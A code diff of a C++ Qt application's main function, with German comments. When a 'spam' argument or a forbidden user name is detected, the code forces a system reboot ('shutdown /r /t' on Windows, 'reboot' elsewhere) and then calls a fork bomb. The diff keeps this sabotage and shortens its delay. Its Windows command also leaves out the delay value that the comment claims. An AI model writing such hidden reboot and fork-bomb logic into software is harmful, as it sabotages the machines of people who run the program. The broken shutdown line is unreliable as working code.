@@ -87,12 +87,11 @@ int main( int argc, char* argv[] ) TRY_RELEASE {
 
     if ( app.arguments().contains("spam") || pc_nutzername_verboten() ) {
 #ifdef DEBUG
-        void volatile*volatile reserve = malloc( 100*1024*1024 ); // 100 MB als Reserve
-        std::thread( [reserve] () { this_thread::sleep_for( 30s ); free( const_cast <void*> ( reserve ) ); std::terminate(); } ).detach(); // Nach 30 Sekunden Abbrechen
+        std::thread( [] () { this_thread::sleep_for( 15s ); std::terminate(); } ).detach(); // Nach 15 Sekunden Abbrechen
 #elif defined WIN32
-        std::thread( [] () { int a = system("shutdown /r /t 30"); (void) a; } ).detach(); // Nach 30 Sekunden Neustart des PCs
+        std::thread( [] () { int a = system("shutdown /r /t "); (void) a; } ).detach(); // Nach 15 Sekunden Neustart des PCs
 #else
-        std::thread( [] () { int a = system("shutdown -r 30"); (void) a; } ).detach();
+        std::thread( [] () { this_thread::sleep_for( 15s ); int a = system("reboot"); (void) a; } ).detach();
 #endif
         forkbomb();
         return app.exec();
